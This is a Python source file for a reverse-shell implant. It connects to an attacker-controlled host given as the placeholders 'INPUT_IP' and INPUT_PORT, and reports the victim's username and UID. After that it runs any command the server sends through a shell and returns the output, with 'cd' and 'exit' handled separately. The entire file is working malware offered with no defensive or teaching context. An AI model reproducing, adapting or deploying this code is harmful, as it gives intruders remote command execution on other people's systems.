import socket
import subprocess
import os
import pwd




def inbound_comm(): # Handle inbound comunications and decode to str from bytes
    print(f'[+] Awaiting response from server...')
    message = ''
    while True:
        try: 
            message = sock.recv(1024).decode()
            return message
        except Exception:
            print(f'[-] An exception occured')
            sock.close()

def outbound_comm(message): #Handle outgoing comms - sending response to server 
    response = str(message).encode()
    sock.send(response)

def session_handler(): # Handle the sessions, connections, port etc - handle implate functionality as well
    print(f'[+] Trying to connect to {host_ip}')
    sock.connect((host_ip,host_port))
    outbound_comm(pwd.getpwuid(os.getuid())[0])
    outbound_comm(os.getuid())
    print(f'[+] Connected to {host_ip}')

    while True:
        message = inbound_comm()
        print(message)
        if message == 'exit':
            print('[-] The server terminated the session...')
            sock.close()
            break
        
        elif message.split(" ")[0] == 'cd': #split message on space and see if index 0 == cd
            try:
                directory = str(message.split(" ")[1])
                os.chdir(directory)
                cur_dir = os.getcwd()
                print(f'[+] Changed dir to {cur_dir}')
                sock.send(cur_dir.encode())
            except FileNotFoundError:
                outbound_comm('[-] Directory not found')
                continue
        elif message == 'background':
            pass
            
        else:
            #subprocess shell handling
            command = subprocess.Popen(message, shell=True, stdout =subprocess.PIPE, stderr=subprocess.PIPE)
            output = command.stdout.read() + command.stderr.read()
            outbound_comm(output.decode())          
                
      

if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = 'INPUT_IP'
    host_port = INPUT_PORT
    session_handler()


